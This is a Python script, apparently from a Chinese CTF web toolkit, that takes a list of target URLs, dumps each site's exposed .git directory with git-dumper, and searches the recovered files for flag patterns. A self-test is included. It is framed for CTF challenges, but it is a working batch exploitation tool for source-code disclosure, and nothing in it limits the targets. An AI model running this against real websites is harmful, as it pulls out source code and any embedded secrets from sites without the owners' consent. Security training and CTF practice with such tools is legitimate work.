# -*- coding: utf-8 -*-
"""git_dump_batch 批量 Git 泄露利用(py3 完善版)

来源: https://github.com/wilesanGH/ctf-web (md_docs/git-dumper使用手册.md 内嵌脚本, 已完善:
     目标参数化、git-dumper 存在性检查、跨平台 flag 搜索替代 grep)
用途: Web/Misc 题 —— 批量对多个站点做 .git 泄露 dump, 并在结果中搜索 flag 模式。

依赖:
    系统需安装 git-dumper: pip install git-dumper

用法:
    python git_dump_batch.py --selftest                        # 自测(仅本地逻辑)
    python git_dump_batch.py -t http://a/.git/ http://b/.git/  # 多目标
    python git_dump_batch.py -f targets.txt --pattern "flag{"  # 从文件读目标+自定义模式
    python git_dump_batch.py -t http://a/.git/ --jobs 10
"""
from __future__ import annotations

import argparse
import os
import re
import shutil
import subprocess
import sys


def dump_one(url: str, out_dir: str, jobs: int = 5) -> bool:
    if shutil.which('git-dumper') is None:
        print('[!] 未找到 git-dumper: pip install git-dumper')
        sys.exit(2)
    print(f'[*] 下载: {url} -> {out_dir}')
    try:
        subprocess.run(['git-dumper', url, out_dir, '--jobs', str(jobs)],
                       check=True)
        return True
    except subprocess.CalledProcessError:
        print(f'[-] 失败: {url}')
        return False


def search_flags(root: str, pattern: str = r'flag\{[^}]{1,80}\}'):
    """在 dump 目录递归搜索 flag 模式(替代 grep, 跨平台)。"""
    hits = []
    rx = re.compile(pattern.encode(), re.IGNORECASE)
    for cur, dirs, files in os.walk(root):
        dirs[:] = [d for d in dirs if d != '.git']   # 跳过 .git 内部对象
        for n in files:
            p = os.path.join(cur, n)
            try:
                if os.path.getsize(p) > 2 * 1024 * 1024:
                    continue
                data = open(p, 'rb').read()
                for m in rx.finditer(data):
                    hits.append((p, m.group().decode('latin-1')))
                    print(f'[FLAG] {p}: {m.group().decode("latin-1")}')
            except (OSError, MemoryError):
                continue
    return hits


def main():
    ap = argparse.ArgumentParser(description='批量 Git 泄露利用')
    ap.add_argument('-t', '--targets', nargs='+', default=[],
                    help='目标 URL 列表(形如 http://site/.git/)')
    ap.add_argument('-f', '--targets-file', help='目标文件(每行一个)')
    ap.add_argument('-o', '--outdir', default='git_dumps', help='输出根目录')
    ap.add_argument('--jobs', type=int, default=5)
    ap.add_argument('--pattern', default=r'flag\{[^}]{1,80}\}',
                    help='dump 后搜索的正则')
    ap.add_argument('--no-search', action='store_true', help='dump 后不自动搜索')
    ap.add_argument('--selftest', action='store_true')
    args = ap.parse_args()

    if args.selftest:
        # 自测搜索逻辑: 构造假 dump 目录
        import tempfile
        ok = True
        d = tempfile.mkdtemp()
        with open(os.path.join(d, 'index.php'), 'wb') as f:
            f.write(b'<?php // flag{d4mp_5c4n_0k} ?>')
        os.makedirs(os.path.join(d, '.git'), exist_ok=True)
        with open(os.path.join(d, '.git', 'config'), 'wb') as f:
            f.write(b'[core]')                     # .git 内部应被跳过
        hits = search_flags(d, r'flag\{[^}]{1,80}\}')
        good = hits and hits[0][0].endswith('index.php')
        ok &= good
        print(f"[{'OK' if good else 'FAIL'}] flag 搜索: {hits}")
        # 负样本
        d2 = tempfile.mkdtemp()
        with open(os.path.join(d2, 'a.txt'), 'wb') as f:
            f.write(b'no flag here')
        good2 = search_flags(d2, r'flag\{[^}]{1,80}\}') == []
        ok &= good2
        print(f"[{'OK' if good2 else 'FAIL'}] 无命中目录返回空")
        sys.exit(0 if ok else 1)

    targets = list(args.targets)
    if args.targets_file:
        with open(args.targets_file, 'r', encoding='utf-8', errors='ignore') as f:
            targets += [x.strip() for x in f if x.strip()]
    if not targets:
        ap.error('-t 或 -f 必填(--selftest 自测)')

    total_hits = []
    for i, url in enumerate(targets, 1):
        out_dir = os.path.join(args.outdir, f'dump_{i}')
        if dump_one(url, out_dir, args.jobs) and not args.no_search:
            total_hits += search_flags(out_dir, args.pattern)
    print(f'\n[+] 完成 {len(targets)} 个目标, 命中 {len(total_hits)} 处')


if __name__ == '__main__':
    main()
